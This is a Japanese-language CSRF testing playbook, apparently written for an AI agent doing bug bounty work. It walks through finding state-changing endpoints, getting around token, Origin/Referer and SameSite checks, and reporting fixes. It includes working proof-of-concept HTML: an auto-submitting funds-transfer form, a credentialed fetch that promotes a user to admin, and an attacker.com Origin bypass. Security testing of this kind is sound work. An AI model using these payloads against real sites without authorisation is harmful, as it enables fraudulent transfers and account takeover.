# CSRF Attack Simulation

`client-side` の Phase 3 から呼ばれる、状態変更 endpoint への CSRF 単独深掘り。

## いつ切替えるか

- 認証済セッションで state を変える endpoint がある (password 変更 / fund 送金 / 設定更新 / role 変更)
- 既存の anti-CSRF token / SameSite cookie / Origin 検証の妥当性を確認したい
- bug bounty で CSRF が高額帯 (admin role 強制 / 出金) に届きそうな対象

**使わない場面**: GET 専用の参照系 (影響低)、強い modern 防御 (SameSite=Strict + double-submit token + Origin 必須) が成立しているとき (確認だけで止める)。

## Phase 1 — state 変更 endpoint の列挙

```
POST  /api/users/me/password
PUT   /api/users/me/email
DELETE /api/sessions/{id}
POST  /api/transfer
POST  /api/admin/promote
```

burp の Logger / Repeater で全 state 変更 request を抽出。

## Phase 2 — 防御要素の確認

各 endpoint について:

```
- 認証方式 (cookie / Authorization Bearer / custom header)
- Anti-CSRF token (form hidden / header X-CSRF-Token / double-submit cookie)
- Origin / Referer 検証
- SameSite 属性 (Strict / Lax / None)
- 必須 custom header (X-Requested-With 等)
```

## Phase 3 — Token 検証緩和

```
- token 削除して送信 → 通る = no validation
- token を別ユーザのものに → 通る = per-session でない
- token を空文字 → 通る = empty allowed
- token を無効値 → 通る = format check only
- POST → GET method 切替で同 endpoint が GET も受付 → token 検証スキップ
- HTTP method override header (X-HTTP-Method-Override) 経由
```

## Phase 4 — Origin / Referer

```
- Origin / Referer 削除 → 通れば SOP 検証なし
- Origin: http://attacker.com → 通れば検証無
- Referer: http://target/.attacker.com → suffix match の bypass
- CORS の `Access-Control-Allow-Origin: null` 緩さ確認
```

## Phase 5 — SameSite bypass

```
SameSite=Lax  : top-level navigation の GET は cookie 送信 → form action=POST + auto submit は Lax で防げる
SameSite=None : 全送信、CSRF に弱い
SameSite=Strict: 完全に防御。bypass はほぼ無い (ただし state 同期が必要)

Lax 環境での bypass:
- GET でも state 変更できる endpoint を探す
- subdomain takeover で同一サイト扱い
- redirect chain 経由で top-level navigation を作る
```

## Phase 6 — PoC HTML

通常 form auto-submit:

```html
<html><body>
<form action="https://target/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

JSON request の場合 fetch + credentials:

```html
<script>
fetch('https://target/api/role', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({role: 'admin'})
})
</script>
```

`Content-Type: application/json` で preflight が要る場合は `text/plain` を使い、サーバが lax parse することに賭ける手もある (成立すれば critical)。

## Phase 7 — 影響実証

```
- victim (test account) にホストした PoC HTML を見せる
- 自動で state 変更が成立したことを示す (DB で password が変わった / transfer が完了した)
- 影響 (admin promote, financial loss, account takeover)
```

## Phase 8 — レポート

```
- 対象 endpoint / method / parameter
- 防御要素の何が緩かったか (token 無 / Origin 無 / SameSite=None / GET 受け入れ)
- PoC HTML
- 影響
- 修正 (token + Origin + SameSite=Lax 三層防御 / state-changing GET 廃止)
```

## Tools

```
burp Repeater / Engagement tools (CSRF PoC generator)
mitmproxy
WebFetch
Bash (sandbox)
```
